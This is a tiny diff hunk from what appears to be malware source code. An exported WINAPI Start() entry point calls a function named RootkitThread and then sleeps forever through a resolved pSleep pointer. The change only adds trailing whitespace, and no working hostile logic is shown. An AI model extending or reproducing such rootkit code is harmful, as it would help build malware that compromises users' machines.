@@ -207,7 +207,7 @@ extern"C"  void WINAPI Start()
 	    
 	RootkitThread(NULL); 
 
-	while (1) pSleep(100000); 
+	while (1) pSleep(100000);    
 }
 
 
